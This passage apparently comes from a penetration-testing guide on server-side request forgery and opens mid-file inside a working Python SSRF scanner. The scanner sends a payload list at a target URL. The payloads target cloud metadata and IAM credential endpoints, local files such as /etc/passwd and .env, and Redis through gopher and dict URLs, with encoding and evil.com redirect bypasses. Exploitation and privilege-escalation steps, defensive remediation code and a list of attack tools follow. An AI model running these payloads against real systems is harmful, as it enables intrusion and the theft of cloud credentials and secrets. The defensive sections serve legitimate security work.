COLLABORATOR = "YOUR_ID.burpcollaborator.net"
TIMEOUT = 10
THREADS = 10

# === SSRF PAYLOADS ===
PAYLOADS = {
    "Localhost — Standard": "http://127.0.0.1",
    "Localhost — Hostname": "http://localhost",
    "Localhost — IPv6": "http://[::1]",
    "Localhost — Decimal": "http://2130706433",
    "Localhost — Hex": "http://0x7f000001",
    "Localhost — Octal": "http://0177.0.0.1",
    "Localhost — IPv6 Mapped": "http://[::ffff:127.0.0.1]",
    "Localhost — Short": "http://127.1",
    "Localhost — Zero": "http://0",
    "AWS Metadata": "http://169.254.169.254/latest/meta-data/",
    "AWS Metadata — Decimal": "http://2852039166/latest/meta-data/",
    "AWS Metadata — Hex": "http://0xa9fea9fe/latest/meta-data/",
    "AWS Metadata — IPv6": "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "AWS IAM Credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS User Data": "http://169.254.169.254/latest/user-data",
    "GCP Metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "Azure Metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "File — /etc/passwd": "file:///etc/passwd",
    "File — /etc/hosts": "file:///etc/hosts",
    "File — /proc/self/environ": "file:///proc/self/environ",
    "File — .env": "file:///var/www/html/.env",
    "Docker Gateway": "http://172.17.0.1",
    "Docker Host": "http://host.docker.internal",
    "K8s API": "https://kubernetes.default.svc",
    "OOB Callback": f"http://{COLLABORATOR}/ssrf-test",
    "DNS Wildcard": "http://127.0.0.1.nip.io",
    "Redirect Bypass": "http://evil.com/redirect-to-metadata",
    "@ Bypass": "http://evil.com@169.254.169.254/latest/meta-data/",
    "Internal 10.x": "http://10.0.0.1",
    "Internal 192.168.x": "http://192.168.1.1",
    "Internal 172.16.x": "http://172.16.0.1",
    "Gopher — Redis": "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "Dict — Redis": "dict://127.0.0.1:6379/INFO",
}


def test_ssrf(name, payload):
    """Test a single SSRF payload."""
    try:
        encoded = urllib.parse.quote(payload, safe='/:@?#=&')
        url = f"{TARGET_URL}?{PARAM_NAME}={encoded}"
        
        start = time.time()
        resp = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=False)
        elapsed = time.time() - start
        
        # Analyze response for SSRF indicators
        indicators = {
            'metadata': any(x in resp.text.lower() for x in ['ami-id', 'instance-id', 'accesskeyid', 'computemetadata', 'subscriptionid']),
            'file_read': any(x in resp.text for x in ['root:', '/bin/bash', 'daemon:', 'www-data']),
            'internal_service': any(x in resp.text.lower() for x in ['redis_version', 'elasticsearch', 'mongodb', 'docker', 'consul']),
            'error_diff': resp.status_code not in [400, 403, 404],
            'content_length': len(resp.text) > 0 and len(resp.text) != len(requests.get(f"{TARGET_URL}?{PARAM_NAME}=http://nonexistent12345.com", timeout=TIMEOUT, verify=False).text) if resp.status_code == 200 else False,
        }
        
        is_vulnerable = any(indicators.values())
        
        return {
            'name': name,
            'payload': payload,
            'status': resp.status_code,
            'length': len(resp.text),
            'time': elapsed,
            'vulnerable': is_vulnerable,
            'indicators': {k: v for k, v in indicators.items() if v},
            'preview': resp.text[:200] if is_vulnerable else ''
        }
        
    except requests.Timeout:
        return {'name': name, 'payload': payload, 'status': 'TIMEOUT', 'vulnerable': False, 'time': TIMEOUT}
    except Exception as e:
        return {'name': name, 'payload': payload, 'status': f'ERROR: {e}', 'vulnerable': False, 'time': 0}


def main():
    print(f"{'='*70}")
    print(f"  SSRF Scanner")
    print(f"{'='*70}")
    print(f"  Target: {TARGET_URL}")
    print(f"  Parameter: {PARAM_NAME}")
    print(f"  Payloads: {len(PAYLOADS)}")
    print(f"{'='*70}\n")
    
    findings = []
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(test_ssrf, name, payload): name for name, payload in PAYLOADS.items()}
        
        for future in as_completed(futures):
            result = future.result()
            status_str = f"{result.get('status', '?')}"
            
            if result.get('vulnerable'):
                findings.append(result)
                print(f"  [+] VULNERABLE: {result['name']}")
                print(f"      Payload: {result['payload']}")
                print(f"      Status: {status_str}, Length: {result.get('length', 0)}")
                print(f"      Indicators: {result.get('indicators', {})}")
                if result.get('preview'):
                    print(f"      Preview: {result['preview'][:100]}...")
                print()
            else:
                print(f"  [-] {result['name']}: {status_str}")
    
    print(f"\n{'='*70}")
    print(f"  Results: {len(findings)} potential SSRF vectors found")
    print(f"{'='*70}")
    
    return findings


if __name__ == "__main__":
    main()
```
::

---

## Methodology

::accordion
  :::accordion-item
  ---
  icon: i-lucide-search
  label: "Phase 1 — Input Discovery"
  ---

  Map every input vector that could trigger server-side HTTP requests.

  ::field-group
    ::field{name="URL Parameters" type="high-priority"}
    `url=`, `link=`, `src=`, `dest=`, `redirect=`, `callback=`, `next=`, `feed=`, `host=`, `domain=`, `path=`, `page=`, `image_url=`, `webhook=`
    ::

    ::field{name="HTTP Headers" type="medium-priority"}
    `Referer`, `X-Forwarded-For`, `Host`, `X-Original-URL`, `X-Forwarded-Host`, custom application headers
    ::

    ::field{name="Request Body" type="high-priority"}
    JSON/XML fields containing URLs, webhook configurations, API endpoint settings, import URLs, avatar URLs
    ::

    ::field{name="File Uploads" type="medium-priority"}
    SVG, XML, HTML, PDF, DOCX, XLSX files containing external references
    ::

    ::field{name="API Specifications" type="low-priority"}
    OpenAPI/Swagger server URLs, GraphQL introspection endpoints
    ::
  ::

  :::

  :::accordion-item
  ---
  icon: i-lucide-flask-conical
  label: "Phase 2 — SSRF Confirmation"
  ---

  Use out-of-band techniques to confirm SSRF.

  1. **Set up listener:** Burp Collaborator, interact.sh, or custom HTTP/DNS server
  2. **Submit callback URL** in every potential SSRF parameter
  3. **Monitor for incoming requests** from the target server's IP
  4. **Analyze request details:** headers, timing, IP address

  ```text
  http://UNIQUE_ID.oast.fun  → Check for DNS/HTTP callback
  http://UNIQUE_ID.burpcollaborator.net → Burp Collaborator
  ```

  If a callback is received, SSRF is confirmed.
  :::

  :::accordion-item
  ---
  icon: i-lucide-shield-off
  label: "Phase 3 — Filter Bypass"
  ---

  If basic payloads are blocked, test bypass techniques:

  | Technique | Payload |
  |-----------|---------|
  | IP encoding (decimal) | `http://2130706433` |
  | IP encoding (hex) | `http://0x7f000001` |
  | IP encoding (octal) | `http://0177.0.0.1` |
  | IPv6 | `http://[::1]` |
  | IPv6 mapped | `http://[::ffff:127.0.0.1]` |
  | DNS wildcard | `http://127.0.0.1.nip.io` |
  | @ symbol | `http://evil.com@127.0.0.1` |
  | Redirect | `http://evil.com/redirect → 127.0.0.1` |
  | DNS rebinding | `http://rbndr.us/...` |
  | URL encoding | `http://%31%32%37%2e%30%2e%30%2e%31` |
  | Protocol change | `gopher://`, `dict://`, `file://` |

  :::

  :::accordion-item
  ---
  icon: i-lucide-crosshair
  label: "Phase 4 — Exploitation"
  ---

  Once SSRF is confirmed and filters are bypassed:

  1. **Cloud metadata extraction** — IAM credentials, tokens, secrets
  2. **Internal network scanning** — discover live hosts and open ports
  3. **Internal service exploitation** — Redis RCE, Elasticsearch data dump, Docker API
  4. **File read** — configuration files, credentials, SSH keys
  5. **Chaining** — Use SSRF to pivot to other vulnerabilities

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Phase 5 — Privilege Escalation"
  ---

  Escalate impact through extracted credentials and access:

  - Use AWS/GCP/Azure credentials for cloud infrastructure access
  - Use database credentials for data access
  - Use SSH keys for server access
  - Use Kubernetes tokens for cluster access
  - Use internal admin panel access for application-level escalation

  :::

  :::accordion-item
  ---
  icon: i-lucide-file-text
  label: "Phase 6 — Documentation"
  ---

  Document findings with:

  - Exact request/response pairs
  - Internal resources accessed
  - Credentials extracted (redacted)
  - Business impact assessment
  - Remediation steps

  :::
::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Input Validation — Allowlist
  icon: i-lucide-shield-check
  ---
  Maintain a strict **allowlist** of permitted domains, IP ranges, and protocols. Reject all URLs that don't match the allowlist. Never use blocklists (they are always incomplete).

  ```python
  ALLOWED_DOMAINS = ['api.partner.com', 'cdn.example.com']
  ALLOWED_SCHEMES = ['https']
  
  def validate_url(url):
      parsed = urlparse(url)
      if parsed.scheme not in ALLOWED_SCHEMES:
          return False
      if parsed.hostname not in ALLOWED_DOMAINS:
          return False
      return True
  ```
  ::

  ::card
  ---
  title: Disable Unnecessary Protocols
  icon: i-lucide-ban
  ---
  Only allow `https://` (and `http://` if necessary). Block all other URI schemes: `file://`, `gopher://`, `dict://`, `ftp://`, `ldap://`, `tftp://`, `jar://`, `netdoc://`.

  ```python
  if not url.startswith(('https://', 'http://')):
      abort(400, "Only HTTP(S) protocols are allowed")
  ```
  ::

  ::card
  ---
  title: Resolve and Validate IP
  icon: i-lucide-globe
  ---
  Resolve the hostname to an IP address **before** making the request. Validate the resolved IP is not in private ranges, loopback, link-local, or metadata ranges.

  ```python
  import ipaddress
  import socket
  
  def is_safe_ip(hostname):
      try:
          ip = ipaddress.ip_address(socket.gethostbyname(hostname))
          if ip.is_private or ip.is_loopback or ip.is_link_local:
              return False
          if ip == ipaddress.ip_address('169.254.169.254'):
              return False
          return True
      except:
          return False
  ```
  ::

  ::card
  ---
  title: Disable Redirect Following
  icon: i-lucide-arrow-right
  ---
  Disable automatic redirect following in HTTP clients. If redirects are necessary, validate **each redirect destination** against the same allowlist.

  ```python
  # Python requests
  response = requests.get(url, allow_redirects=False)
  
  # Node.js axios
  axios.get(url, { maxRedirects: 0 })
  
  # Java HttpURLConnection
  connection.setInstanceFollowRedirects(false);
  
  # PHP cURL
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
  ```
  ::

  ::card
  ---
  title: Cloud Metadata Protection
  icon: i-lucide-cloud
  ---
  - **AWS:** Enable **IMDSv2** (requires token-based access)
  - **GCP:** Metadata requests require `Metadata-Flavor: Google` header
  - **Azure:** Block metadata IP in network security groups
  - **All clouds:** Use VPC firewall rules to restrict metadata access to specific instance roles
  ::

  ::card
  ---
  title: Network Segmentation
  icon: i-lucide-network
  ---
  Place the application in a **DMZ** with restricted access to internal networks. Use firewall rules to limit which internal services the application server can reach. Implement **zero-trust** networking.
  ::

  ::card
  ---
  title: DNS Rebinding Protection
  icon: i-lucide-shield
  ---
  - Pin the DNS resolution (resolve once, use for both validation and request)
  - Set DNS TTL checking
  - Use a DNS resolver that ignores low TTL values
  - Validate the IP address at connection time, not just at resolution time
  ::

  ::card
  ---
  title: Response Handling
  icon: i-lucide-eye-off
  ---
  Never return raw responses from internal requests to the user. Process and sanitize the response. Strip headers, limit content length, and validate content type before returning to the client.
  ::

  ::card
  ---
  title: WAF Rules
  icon: i-lucide-brick-wall
  ---
  Deploy WAF rules to detect and block:
  - Internal IP addresses in request parameters
  - Cloud metadata IP (`169.254.169.254`)
  - Non-HTTP protocols (`gopher://`, `file://`, `dict://`)
  - DNS rebinding indicators
  ::

  ::card
  ---
  title: Monitoring & Alerting
  icon: i-lucide-bell
  ---
  Monitor outbound requests from application servers. Alert on:
  - Requests to internal IP ranges
  - Requests to cloud metadata endpoints
  - Requests using non-HTTP protocols
  - Unusual outbound request patterns
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite + Collaborator
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and modify SSRF parameters. Burp Collaborator detects blind SSRF via DNS and HTTP callbacks. Scanner detects basic SSRF automatically.
  ::

  ::card
  ---
  title: SSRFmap
  icon: i-lucide-map
  to: https://github.com/swisskyrepo/SSRFmap
  target: _blank
  ---
  Automated SSRF exploitation framework. Supports multiple protocols, cloud metadata extraction, and internal service exploitation modules.
  ::

  ::card
  ---
  title: Gopherus
  icon: i-lucide-terminal
  to: https://github.com/tarunkant/Gopherus
  target: _blank
  ---
  Generates gopher payloads for exploiting Redis, MySQL, PostgreSQL, FastCGI, SMTP, and other internal services via SSRF.
  ::

  ::card
  ---
  title: Interactsh (interact.sh)
  icon: i-lucide-radio
  to: https://github.com/projectdiscovery/interactsh
  target: _blank
  ---
  Open-source out-of-band interaction server. Detects blind SSRF via DNS, HTTP, SMTP, and other protocol callbacks.
  ::

  ::card
  ---
  title: SSRFire
  icon: i-lucide-flame
  to: https://github.com/ksharinarayanan/SSRFire
  target: _blank
  ---
  Automated SSRF finder and exploitation tool. Supports multiple bypass techniques and cloud metadata extraction.
  ::

  ::card
  ---
  title: Singularity of Origin
  icon: i-lucide-rotate-cw
  to: https://github.com/nccgroup/singularity
  target: _blank
  ---
  DNS rebinding attack framework. Creates controlled DNS rebinding conditions to bypass SSRF IP validation.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for discovering SSRF parameters and testing bypass payloads. Use with SSRF-specific wordlists.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based vulnerability scanner with extensive SSRF detection templates for cloud metadata, internal services, and protocol-based SSRF.
  ::

  ::card
  ---
  title: ground-control
  icon: i-lucide-satellite
  to: https://github.com/jobertabma/ground-control
  target: _blank
  ---
  Collection of scripts for debugging SSRF, blind XSS, and XXE vulnerabilities through out-of-band callbacks.
  ::
::